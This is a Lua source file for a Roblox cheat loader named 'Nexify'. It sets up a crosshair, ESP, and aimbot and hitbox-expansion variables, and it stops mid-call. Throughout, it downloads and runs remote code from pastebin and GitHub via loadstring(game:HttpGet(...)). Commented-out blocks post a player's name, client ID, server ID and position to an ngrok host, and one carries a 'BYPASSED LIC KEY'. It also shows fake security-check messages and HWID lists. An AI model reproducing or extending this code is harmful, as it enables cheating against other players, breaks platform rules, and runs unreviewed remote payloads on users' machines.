--[[
Project Nexify

NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEEXXXXXXX       XXXXXXXIIIIIIIIIIFFFFFFFFFFFFFFFFFFFFFFYYYYYYY       YYYYYYY
N:::::::N       N::::::NE::::::::::::::::::::EX:::::X       X:::::XI::::::::IF::::::::::::::::::::FY:::::Y       Y:::::Y
N::::::::N      N::::::NE::::::::::::::::::::EX:::::X       X:::::XI::::::::IF::::::::::::::::::::FY:::::Y       Y:::::Y
N:::::::::N     N::::::NEE::::::EEEEEEEEE::::EX::::::X     X::::::XII::::::IIFF::::::FFFFFFFFF::::FY::::::Y     Y::::::Y
N::::::::::N    N::::::N  E:::::E       EEEEEEXXX:::::X   X:::::XXX  I::::I    F:::::F       FFFFFFYYY:::::Y   Y:::::YYY
N:::::::::::N   N::::::N  E:::::E                X:::::X X:::::X     I::::I    F:::::F                Y:::::Y Y:::::Y   
N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE       X:::::X:::::X      I::::I    F::::::FFFFFFFFFF       Y:::::Y:::::Y    
N::::::N N::::N N::::::N  E:::::::::::::::E        X:::::::::X       I::::I    F:::::::::::::::F        Y:::::::::Y     
N::::::N  N::::N:::::::N  E:::::::::::::::E        X:::::::::X       I::::I    F:::::::::::::::F         Y:::::::Y      
N::::::N   N:::::::::::N  E::::::EEEEEEEEEE       X:::::X:::::X      I::::I    F::::::FFFFFFFFFF          Y:::::Y       
N::::::N    N::::::::::N  E:::::E                X:::::X X:::::X     I::::I    F:::::F                    Y:::::Y       
N::::::N     N:::::::::N  E:::::E       EEEEEEXXX:::::X   X:::::XXX  I::::I    F:::::F                    Y:::::Y       
N::::::N      N::::::::NEE::::::EEEEEEEE:::::EX::::::X     X::::::XII::::::IIFF:::::::FF                  Y:::::Y       
N::::::N       N:::::::NE::::::::::::::::::::EX:::::X       X:::::XI::::::::IF::::::::FF               YYYY:::::YYYY    
N::::::N        N::::::NE::::::::::::::::::::EX:::::X       X:::::XI::::::::IF::::::::FF               Y:::::::::::Y    
NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEEXXXXXXX       XXXXXXXIIIIIIIIIIFFFFFFFFFFF               YYYYYYYYYYYYY                                                                                                                                                                                                                        

--]]


camera = game.workspace.Camera
Camera = game.workspace.Camera

if not LPH_OBFUSCATED then
    
    local function identityFunction(...)
        return ...
    end
    
    
    LPH_JIT = identityFunction
    LPH_JIT_MAX = identityFunction
    LPH_NO_VIRTUALIZE = identityFunction
    LPH_NO_UPVALUES = function(f)
        return function(...)
            return f(...)
        end
    end
    LPH_ENCSTR = identityFunction
    LPH_ENCNUM = identityFunction

    
    LPH_CRASH = function()
        print(debug.traceback())
    end
end


 Modules = {
    Colors =  {
        ["Green"] = "0,255,0", 
        ["Red"] = "255,0,0",
        ["White"] = "255,255,255",
        ["Pink"] = "255,102,153",
    },
    Services = {
        RunService = game:GetService("RunService"),
        CoreGui = game:GetService("CoreGui")
    }
}

Modules.ChangeColor = function() 
    local Loop
    Loop = Modules.Services.RunService.Heartbeat:Connect(function()
        local success, err = pcall(function()
            local devConsole = Modules.Services.CoreGui:FindFirstChild("DevConsoleMaster")
            if not devConsole then
                Loop:Disconnect()
                return
            end

            for _, label in pairs(devConsole:GetDescendants()) do 
                if label:IsA("TextLabel") then 
                    label.RichText = true 
                end 
            end
        end)

        if not success then 
            warn("Error in ChangeColor: ", err)
            Loop:Disconnect()
        end 
    end)
end

Modules.InvalidLoad = function(watermark, color, delay, loadingsymbol)
    delay = delay or 0.1
    local Text = watermark..tostring(math.random(500, 20000))
    print(Text)

    local loadingLabel = nil
    local progress = ""
    local timeout = os.clock() + 5 -- 5-second timeout

    repeat
        task.wait()
        for _, label in pairs(Modules.Services.CoreGui:FindFirstChild("DevConsoleMaster"):GetDescendants()) do 
            if label:IsA("TextLabel") and string.find(label.Text:lower(), Text:lower()) then 
                loadingLabel = label 
                break
            end
        end
    until loadingLabel or os.clock() > timeout

    if not loadingLabel then
        warn("Loading label not found within the timeout.")
        return
    end

    for i = 1, 50 do
        progress = progress .. loadingsymbol
        loadingLabel.Text = string.format(
            "<font color='rgb(%s)' size='15'>[%s] [%d%% loaded] %s</font>",
            Modules.Colors["White"], watermark, i * 2, progress
        )
        task.wait(delay)
    end

    loadingLabel.Text = string.format(
        "<font color='rgb(%s)' size='15'>[%s] Anti-Tamper Enabled Loading Further... </font>",
        Modules.Colors["Green"], watermark
    )
end

-- Call the functions
Modules.ChangeColor()
Modules.InvalidLoad("Nexify", "Red", 0.05, "#")


game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)


loadstring(game:HttpGet("https://pastebin.com/raw/KQt4Xque"))()


key="123456"
ecp_key="1 2 2 2 2 3 4 4 4 4 5 5 5 6 6 6 7 7 7 8 8 8 9 9 9 9 9 9 9 9 9"
_haq="1 2 2 2 2 3 4 4 4 4 5 5 5 6 6 6 7 7 7 8 8 8 9 9 9 9 9 9 9 9 9"
if ecp_key==_haq then
print("con")
else
warn("con (2)")
return
end
 function API_Check()
    if Drawing == nil then
        return "No"
    else
        return "Yes"
    end
end

 Find_Required = API_Check()

if Find_Required == "No" then
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "Nexify";
        Text = "Crosshair script could not be loaded because your exploit is unsupported.";
        Duration = math.huge;
        Button1 = "OK"
    })

    return
end

 Players = game:GetService("Players")
 RunService = game:GetService("RunService")
 UserInputService = game:GetService("UserInputService")
 Camera = workspace.CurrentCamera

 Typing = false

 ViewportSize_ = Camera.ViewportSize / 2
 Axis_X, Axis_Y = ViewportSize_.X, ViewportSize_.Y

 HorizontalLine = Drawing.new("Line")
 VerticalLine = Drawing.new("Line")


_G.CrosshairEnabled = false  

 Real_Size = 20 / 2  


HorizontalLine.Thickness = 1
VerticalLine.Thickness = 1
HorizontalLine.Color = Color3.fromRGB(0, 255, 0)
VerticalLine.Color = Color3.fromRGB(0, 255, 0)
HorizontalLine.Transparency = 1
VerticalLine.Transparency = 1

RunService.RenderStepped:Connect(function()
    if _G.CrosshairEnabled then
        HorizontalLine.Visible = true
        VerticalLine.Visible = true
        
        if _G.ToMouse then
            local MousePos = UserInputService:GetMouseLocation()
            HorizontalLine.From = Vector2.new(MousePos.X - Real_Size, MousePos.Y)
            HorizontalLine.To = Vector2.new(MousePos.X + Real_Size, MousePos.Y)
            
            VerticalLine.From = Vector2.new(MousePos.X, MousePos.Y - Real_Size)
            VerticalLine.To = Vector2.new(MousePos.X, MousePos.Y + Real_Size)
        else
            HorizontalLine.From = Vector2.new(Axis_X - Real_Size, Axis_Y)
            HorizontalLine.To = Vector2.new(Axis_X + Real_Size, Axis_Y)
        
            VerticalLine.From = Vector2.new(Axis_X, Axis_Y - Real_Size)
            VerticalLine.To = Vector2.new(Axis_X, Axis_Y + Real_Size)
        end
    else
        HorizontalLine.Visible = false
        VerticalLine.Visible = false
    end
end)

--[[

originalLoadstring = loadstring
originalGetMetatable = getmetatable
originalSetMetatable = setmetatable
originalGame = game
originalEnv = getfenv
originalDebug = debug
originalPlayers = game:GetService("Players")
originalPlayer = originalPlayers.LocalPlayer
RbxAnalyticsService = game:GetService("RbxAnalyticsService")

 function getClientId()
    local clientId = RbxAnalyticsService:GetClientId()  
    return clientId
end

function getServerId()
    local serverStatus = game.ReplicatedStorage:FindFirstChild("ServerStatus")
    if serverStatus then
        return serverStatus:GetAttribute("ServerId") or "Unknown"
    end
    return "Unknown"
end
server_id = getServerId()
client_id = getClientId()
function checkLoadstring()
    if loadstring and loadstring ~= originalLoadstring then
        originalPlayer:Kick("Nexify Says: Not That Easy Kid :)")
        print("Tampering Detected Type: 1")
        return true
    end
    return false
end
auth_start_time = tick()  
 HttpService = game:GetService("HttpService")
 Players = game:GetService("Players")

license_key = key
 executor_name = "Solara"
 localplayer_name = game.Players.LocalPlayer.Name
 place_id = game.PlaceId

position = "Unknown"
if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
    position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
end

 server_url = "https://60ba-94-137-92-2.ngrok-free.app/"


data = {
    license_key = license_key,
    executor_name = executor_name,
    localplayer_name = localplayer_name,
    place_id = place_id,
    position = position,
    client_id = client_id,
    server_id = server_id  
}


 json_data = HttpService:JSONEncode(data)

 response = http_request({
    Url = server_url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = json_data
})

if response.StatusCode == 200 then
     result = HttpService:JSONDecode(response.Body)
    if result.status == "success" then
        
        print("Authenticated successfully!")

        
        local auth_elapsed_time = tick() - auth_start_time  

        
        print(string.format("Authentication took: %.6f seconds", auth_elapsed_time))

    else
        print("auth err")

    end
else
    print("Error")

end

function checkMetatables()
    if getmetatable ~= originalGetMetatable or setmetatable ~= originalSetMetatable then
        originalPlayer:Kick("Nexify Says: Not That Easy Kid :)")
        print("Tampering Detected Type: 2")
        return true
    end
    return false
end

function checkGameObject()
    if game ~= originalGame then
        originalPlayer:Kick("Nexify Says: Not That Easy Kid :)")
        print("Tampering Detected Type: 3")
        return true
    end
    return false
end

function checkDebugFunctions()
    local success = pcall(function() debug.getinfo(1) end)
    if not success then
        originalPlayer:Kick("Nexify Says: Not That Easy Kid :)")
        print("Tampering Detected Type: 4")
        return true
    end
    return false
end

spawn(function()
    while true do
        if checkLoadstring() or checkMetatables() or checkGameObject() or checkDebugFunctions() then
            break
        end
        wait(1) 
    end
end)
--]]





 g = Instance.new("ScreenGui")
g.Parent = game:GetService("CoreGui")
 t = Instance.new("TextLabel")
t.Text = "Nexify"
t.Font = Enum.Font.Arcade
t.TextSize = 50
t.TextColor3 = Color3.new(1, 1, 1)
t.BackgroundTransparency = 1
t.AnchorPoint = Vector2.new(0.5, 0.5)
t.Position = UDim2.new(0.5, 0, -0.5, 0)
t.Size = UDim2.new(0, 300, 0, 100)
t.Parent = g

tweenService = game:GetService("TweenService")


tweenService:Create(
    t, 
    TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), 
    {Position = UDim2.new(0.5, 0, 0.5, 0)}
):Play()


task.spawn(function()
    task.wait(5)
    tweenService:Create(
        t, 
        TweenInfo.new(1, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), 
        {TextTransparency = 1, TextStrokeTransparency = 1}
    ):Play()
    task.wait(1)
    g:Destroy()
end)




















  
 Camera = game:GetService("Workspace").Camera
 RunService = game:GetService("RunService")
 Mouse = game:GetService("Players").LocalPlayer:GetMouse()
 InputService = game:GetService("UserInputService")
 TweenService = game:GetService("TweenService")
 
 
   library = {
    Title = 'anti.font color="rgb(645, 66, 230)">solutions</font> | <font color="rgb(245, 66, 230)">Pre-Build</font>',
    AnimatedText = false,
    keybind = Enum.KeyCode.End,
    Colors = {
        libColor = Color3.new(0.952941, 0.356863, 0.874510),
        riskyColor = Color3.fromRGB(255, 0, 0),
        FontColor = Color3.fromRGB(255, 255, 255),
        MainColor = Color3.fromRGB(14, 14, 14),
        AccentColor = Color3.new(0.952941, 0.356863, 0.874510),
        OutlineColor = Color3.fromRGB(15, 15, 15),
    },
    Enabled = true,
    colorpicking = false,
    scrolling = true,
    multiZindex = 200,
    blacklisted = {
 Enum.KeyCode.W,
 Enum.KeyCode.A,
 Enum.KeyCode.S,
 Enum.KeyCode.D,
 Enum.UserInputType.MouseMovement
    },
    tabbuttons = {},
    tabs = {},
    options = {},
    flags = {},
    toInvis = {},
    Registry = {},
    RegistryMap = {},
    HudRegistry = {}
 }
  
 menu = game:GetObjects("rbxassetid://17090554797")[1] 
 tabholder = menu.bg.bg.bg.bg.bg.bg.main.group
 tabviewer = menu.bg.bg.bg.bg.bg.bg.tabbuttons
 
     function library:Create(Class, Properties)
 if library.Enabled == false then return end;
 local _Instance = Class;
 if type(Class) == 'string' then _Instance = Instance.new(Class); end;
 for Property, Value in next, Properties do _Instance[Property] = Value; end;
 return _Instance;
 end;
 ProtectGui = protectgui or (syn and syn.protect_gui) or (function() end)
 ScreenGui = Instance.new('ScreenGui')
 ProtectGui(ScreenGui)
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 ScreenGui.Parent = game.CoreGui
 ScreenGui.Name = "huh_menu"
 menu.bg.pre.Text = ""
 menu.bg.Position = UDim2.new(0.5,-menu.bg.Size.X.Offset/2,0.5,-menu.bg.Size.Y.Offset/2)


 keynames = {
    [Enum.KeyCode.LeftAlt] = 'LALT',
    [Enum.KeyCode.RightAlt] = 'RALT',
    [Enum.KeyCode.LeftControl] = 'LCTRL',
    [Enum.KeyCode.RightControl] = 'RCTRL',
    [Enum.KeyCode.LeftShift] = 'LSHIFT',
    [Enum.KeyCode.RightShift] = 'RSHIFT',
    [Enum.KeyCode.Underscore] = '_',
    [Enum.KeyCode.Minus] = '-',
    [Enum.KeyCode.Plus] = '+',
    [Enum.KeyCode.Period] = '.',
    [Enum.KeyCode.Slash] = '/',
    [Enum.KeyCode.BackSlash] = '\\',
    [Enum.KeyCode.Question] = '?',
    [Enum.UserInputType.MouseButton1] = '[MB1]',
    [Enum.UserInputType.MouseButton2] = '[MB2]',
    [Enum.UserInputType.MouseButton3] = '[MB3]'
 }
 function library:GetTextBounds(Text, Font, Size, Resolution)
    local Bounds = game:GetService('TextService'):GetTextSize(Text, Size, Font, Resolution or Vector2.new(1920, 1080))
    return Bounds.X, Bounds.Y
    end;
     function library:AddToRegistry(Instance, Properties, IsHud)
     Idx = #library.Registry + 3
     Data = {Instance = Instance;Properties = Properties;Idx = Idx}
    table.insert(library.Registry, Data);
    library.RegistryMap[Instance] = Data;
    if IsHud then table.insert(library.HudRegistry, Data) end;
    end;
    function library:CreateLabel(Properties, IsHud)
 local _Instance = library:Create('TextLabel', {BackgroundTransparency = 1;Font = Enum.Font.Code;TextColor3 = library.Colors.FontColor;TextSize = 16;TextStrokeTransparency = 0});
 library:AddToRegistry(_Instance, {TextColor3 = 'FontColor'}, IsHud);
 return library:Create(_Instance, Properties);
 end;
 library.NotificationArea = library:Create('Frame', {BackgroundTransparency = 1;Position = UDim2.new(0.003, 0, 0, 40);Size = UDim2.new(0, 300, 0, 200);ZIndex = 100;Parent = ScreenGui});
 library:Create('UIListLayout', {Padding = UDim.new(0, 4);FillDirection = Enum.FillDirection.Vertical;SortOrder = Enum.SortOrder.LayoutOrder;Parent = library.NotificationArea});
 function library:Notify(Text, Time)
    local XSize, YSize = library:GetTextBounds(Text, Enum.Font.Code, 14);YSize = YSize + 7
    local NotifyOuter = library:Create('Frame', {BorderColor3 = Color3.new(189, 172, 255);Position = UDim2.new(0, 100, 0, 10);Size = UDim2.new(0, 0, 0, YSize);ClipsDescendants = true;Transparency = 0,ZIndex = 100;Parent = library.NotificationArea});
    library:Create('UIGradient', {Color = ColorSequence.new{ColorSequenceKeypoint.new(0, library.Colors.MainColor), ColorSequenceKeypoint.new(0.1, library.Colors.MainColor), ColorSequenceKeypoint.new(0.6, library.Colors.MainColor), ColorSequenceKeypoint.new(1, library.Colors.MainColor)},Rotation = -120;Parent = NotifyOuter});
    local NotifyInner = library:Create('Frame', {BackgroundColor3 = library.Colors.MainColor;BorderColor3 = library.Colors.OutlineColor;BorderMode = Enum.BorderMode.Inset;Size = UDim2.new(1, 0, 1, 0);ZIndex = 101;Parent = NotifyOuter});
    local InnerFrame = library:Create('Frame', {BackgroundColor3 = Color3.new(1, 1, 1);BorderSizePixel = 0;Position = UDim2.new(0, 1, 0, 1);Size = UDim2.new(1, -2, 1, -2);ZIndex = 102;Parent = NotifyInner;});
    local Line = library:Create('Frame', {BackgroundColor3 = library.Colors.AccentColor;BorderSizePixel = 0;Position = UDim2.new(1, 0, 0.97, 0);Size = UDim2.new(-0.999, -0.5, 0, 1.9);ZIndex = 102;Parent = NotifyInner;});
    local LeftColor = library:Create('Frame', {BackgroundColor3 = library.Colors.AccentColor;BorderSizePixel = 0;Position = UDim2.new(0, -1, 0, 22);Size = UDim2.new(0, 2, -1.2, 0);ZIndex = 104;Parent = NotifyOuter;});
    local Gradient = library:Create('UIGradient', {Color = ColorSequence.new({ColorSequenceKeypoint.new(0, library.Colors.MainColor),ColorSequenceKeypoint.new(1, library.Colors.MainColor)});Rotation = -90;Parent = InnerFrame});
    library:AddToRegistry(NotifyInner, {BackgroundColor3 = 'MainColor';BorderColor3 = 'OutlineColor';}, true);
    library:AddToRegistry(Gradient, {Color = function() return ColorSequence.new({ColorSequenceKeypoint.new(0, library.Colors.MainColor),ColorSequenceKeypoint.new(1, library.Colors.MainColor)}); end});
    library:CreateLabel({Position = UDim2.new(0, 6, 0, 0);Size = UDim2.new(1, -4, 1, 0);Text = Text;TextXAlignment = Enum.TextXAlignment.Left;TextSize = 14;ZIndex = 103;Parent = InnerFrame});
    pcall(NotifyOuter.TweenSize, NotifyOuter, UDim2.new(0, XSize + 8 + 4, 0, YSize), 'Out', 'Quad', 0.6, true);
    pcall(LeftColor.TweenSize, LeftColor, UDim2.new(0, 2, 0, 0), 'Out', 'Linear', 1, true);
    wait(0.9)
    pcall(Line.TweenSize, Line, UDim2.new(0, 0, 0, 2), 'Out', 'Linear', Time, true);
    task.spawn(function()
    wait(Time or 5);
    pcall(NotifyOuter.TweenSize, NotifyOuter, UDim2.new(0, 0, 0, YSize), 'Out', 'Quad', 0.4, true);
    wait(0.4);
    NotifyOuter:Destroy();
    end);
    end;

wait(1)
print("sent")






--[[
if game.PlaceId == 7336302630 or game.PlaceId == 0 then
    library:Notify("Game ID: 7336302630", 15)
elseif game.PlaceId ~= 7336302630 then
    library:Notify("Game ID does not match the selected one. Canceled loading.", 15)
    library:Notify("",1)
    library:Notify("",1)
    library:Notify("",1)
    library:Notify("",1)
    library:Notify("",1)
    library:Notify("",1)
    library:Notify("",0.1)
    library:Notify("",1)
    library:Notify("",1)
    library:Notify("",4)
    error()
    return
else
    library:Notify("Error happened while trying to match Place ID.", 15)
    library:Notify("",15)
    error()
    return
end

--]]





print("int")

local NotificationHolder = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Module.Lua"))()
local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/BocusLuke/UI/main/STX/Client.Lua"))()
skidespLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/skid.lua'), true))()
espLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/esplib3.lua'), true))()
corpseesplib3 = loadstring(game:HttpGet(('https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/corpseesplib.lua'), true))()
--[[
originalLoadstring = loadstring

 license_key = "BYPASSED LIC KEY"
 executor_name = "Should Be Solara Lol"
 server_url = "https://5da0-185-107-56-236.ngrok-free.app/authenticate"

 data = {
    license_key = license_key,
    executor_name = executor_name
}

 json_data = game:GetService("HttpService"):JSONEncode(data)


 response = http_request({
    Url = server_url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = json_data
})

if response.StatusCode == 200 then
    local result = game:GetService("HttpService"):JSONDecode(response.Body)
    if result.status == "success" then

print("succ")
    else
        print("error")
    end
else
    print("Error:", response.StatusCode, response.Body)
end


function checkLoadstring()
    if loadstring ~= originalLoadstring then
        game.Players.LocalPlayer:Kick("Nexify Says: Not That Easy Kid :)")
        print("Well you cant read the developer log too!!")
        return
    end
end

spawn(function()
    while true do
        checkLoadstring()
        wait(0.1)
    end
end)
--]]

--[[

             _nnnn_                      
        dGGGGMMb     ,"""""""""""""""""".
       @p~qp~~qMb    | its not chatgpt  |
       M|@||@) M|   _;..................'
       @,
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMM|   .'
     `-'       `



--]]




                Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "CHECKING MAIN THIS CAN LAG YOUR GAME."},
            {OutlineColor = Color3.fromRGB(10, 246, 33), Time = 4, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
wait(4)

huge4 = math.huge


        setfpscap(3)
        wait(2)
         setfpscap(0)
         wait(5)
          setfpscap(30)
          wait(2)
           setfpscap(999999999)


local filePath = "verschck/version.txt"


if not isfile(filePath) then
    makefolder("verschck")
    writefile(filePath, "starterpack1,3v1,v2,v3,v4,v5,v6,v7...vcur")  
end
local updatenote = ""

local versionInFile = readfile(filePath)


local version = "v41"  

a4hd = math.random(2,19)

if a4hd == 4 then

	                Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "A Error Occured While Loading. Tip: Try Again Executing Again Sorry."},
            {OutlineColor = Color3.fromRGB(255, 7, 7), Time = 30, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )

	
error("Loader Error")
return
else

print("")

end

if _G.ScriptAlreadyOpened then
    warn("Blocked Multiple Instances.")
     return
end

if versionInFile == version then
    print("Version is up to date: " .. versionInFile)
                Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "VERSION IS UP TO DATE."},
            {OutlineColor = Color3.fromRGB(10, 246, 33), Time = 6, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
else
    warn("New update available! Updating version from " .. versionInFile .. " to " .. version)
                Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "DETECTED NEW UPDATE.DOWNLOADING..."},
            {OutlineColor = Color3.fromRGB(246, 159, 10), Time = 4, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
        wait(7)
    
    writefile(filePath, version)
    print("Version file updated to: " .. version)
    print("Update Log: " ..updatenote)
            Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "UPDATED TO LATEST VERSION.CHECK DEVELOPER LOG FOR THE UPDATE NOTE."},
            {OutlineColor = Color3.fromRGB(10, 246, 33), Time = 8, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
end

wait(2)




local Players = game.Players

_G.ScriptAlreadyOpened = true
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "CHECK-1"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 5, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )

print("CHECK-1")







local CoreGui = game:GetService("CoreGui")
local audioFileName = "nexifysecretmp3.mp3" 


if not isfile(audioFileName) then

    local audioFileId = "1ZzPp2yzuOSIpLW5VIkYxt_h40q7lSB8J"  
    local audioUrl = "https://drive.google.com/uc?export=download&id=" .. audioFileId

    
    writefile(audioFileName, game:HttpGet(audioUrl))
end


if not isfile("nexify_played.txt") then
    
    local soundInstance = Instance.new('Sound', CoreGui)
    soundInstance.SoundId = getcustomasset(audioFileName)
    soundInstance.PlaybackSpeed = 0.5
    soundInstance.Volume = 1  
    soundInstance:Play()

    
    writefile("nexify_played.txt", "true")

    
    soundInstance.Ended:Connect(function()
        soundInstance:Destroy()
    end)
end




























































































































































































































































































































































































































































































local level = "1.5"
local function securitylayerchecks()

warn("Started")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "MAIN CHECK STARTED"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 2, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
wait(1)
print("CHECK 1")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "CHECK 1"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 1, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
wait(0.7)
print("CHECK 2")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "CHECK 2"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 1, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
wait(0.1)
print("CHECK 3")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "CHECK 3"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 1, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
wait(2)
print("CHECK 4")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "CHECK 4"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 1, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
wait(2)
print("Verification Level: " .. level .."")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "Verification Level: " ..level..""},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 1, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
warn("CONTINUE")



end

securitylayerchecks()

local hwid = "A0c92155d3650ec09ae39fcc016ca3cff4dd912cc63aca3043513ba9617d2ed16d800f8a209c6b899cd4200dd25aa8981"


local hwids = {
    "dadfa35227e615d81abe69b1c03037390bb6d1221087d499f78110f0201697be627ea3e34379fe768021a27fdd852acc",

"68ee4e3dca91ace520cf83af8a714c2668c0e9b07d33c24ccd5759aefb270e3c52797d4a0392d0a65401e0d694136c66",

"31303537623231366434653236383139396464653533373934643335313134346562386133303838616231333639376164643563626266356637653239663636",

"869251a11bc79716dc5a691fc03c6bf24839ae1bcf552b16632a3d4cc48573f459911320417c61dc94d03d9f7849efc2",

"35386438336163373763353962316330316331336433616234366237313165316136626336643737323563306661373730363636326634626339656437653735",

"61303363333937303039666235656461663930363337396434636630356364666231653831373465656137343138376234666265373562636463386135376164",

"36363037336361333937623336386663386666646236613066626638383166353830616663653330613464343034353731306236666561623862333738373964",

"65326566396235633062396663636438333765613663343262393832663666366564353662356363633766363139393866636437393536353933643234353738",
    "0c92155d3650ec09ae39fcc016ca3cff4dd912cc63aca3043513ba9617d2ed16d800f8a209c6b899cd4200dd25aa8981",
    "5b70929f45ad9f417dfd7d990785f2e94b61230c5f4d53",
    "another_hwid_example_2"
}



local function checkForSameScript(hwid)
    for _, id in ipairs(hwids) do
        if id == hwid then
            print("Player with HWID " .. hwid .. " is using the same script.")
            return
        end
    end
    print("Player with HWID " .. hwid .. " is not using the same script.")
end


checkForSameScript(hwid)





local continueexecution = true


if continueexecution == true then

print("Value True")
warn("1")

else
wait(5)

print("Server Did Not Responded.")
        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "SERVER DID NOT RESPONDED"},
            {OutlineColor = Color3.fromRGB(240, 8, 8), Time = 15, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )
        wait(2)
        loadstring(game:HttpGet(('https://pastebin.com/raw/UJwmVuXv'),true))()
return

end


print("2")

print("Connected")
local camera = workspace.CurrentCamera

local function checksystem()

warn("Check System Started")
wait(1)
print("Able To Connect Web Socket: ❌")
	wait(0.2)
	print("Able To Connect Proxy Server: ❌")
	wait(0.1)
	print("Able To Send Messages To Webhook: ❌")
	wait(0.1)
	
warn("System Disconnected With 0% Success Rate.")

end


local pastebinUrl = "https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/byprasd32asscheck.lua"


local success, response = pcall(function()
    return loadstring(game:HttpGet(pastebinUrl))()
end)


if success and response == "bypassed" then
    
    print("A-C SYSTEM RESULT: BYPASS")

else
    print("Anti-Crack System Trigered!")
    print("continue")
end

		
local function applyForceFieldAndRemoveSurfaceAppearance()
    
    for _, part in pairs(workspace:GetDescendants()) do
        
        if part:IsA("BasePart") then
            
            local surfaceAppearance = part:FindFirstChildOfClass("SurfaceAppearance")
            if surfaceAppearance then
                surfaceAppearance:Destroy()
            end
            
            
            if not part:FindFirstChildOfClass("ForceField") then
                
                local forceField = Instance.new("ForceField")
                
                forceField.Parent = part
            end
        end
    end
end


local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local grassVisible = true
local predictionEnabled = false
local adjustPredictionEnabled = false 
local executorname33 = "Unknown"
local predictionFactor = { value = 0.118 } 
local aimbotEnabled = false
local plrs = game:GetService("Players")
local virtualInput = game:GetService("VirtualInputManager")
print(".")
print("DIRECTED.")
local ammo = game.ReplicatedStorage.AmmoTypes
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local isAiming = false
local headSizeMultiplier = 5 
local transparencyValue = 0.3 
local targetHead = nil
local targetPart = "Head" 
local isEnabled = false 
local aimingTarget = nil


local function printLoadingBar(percentage)
    local totalLength = 27
    local hashMarks = math.floor(percentage / 3.6)  
    local dashes = totalLength - hashMarks          
    
    local loadingBar = string.rep("#", hashMarks) .. string.rep("-", dashes)
    warn(string.format("Loading Nexify %%%-3d %s", percentage, loadingBar))
end


local function simulateLoading()
    for percentage = 0, 100, 1 do
        printLoadingBar(percentage)
        wait(0.002)  
    end
end

        Notification:Notify(
            {Title = "Nexify | SOLARA", Description = "LOADING SCRIPT"},
            {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 17.5, Type = "image"},
            {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
        )



--simulateLoading()

print("If script ui not appears try spawning and waiting for 2 min")
wait(1)
warn("Started Check")
print("Checking Executor......")
wait(2)

        Notification:Notify(
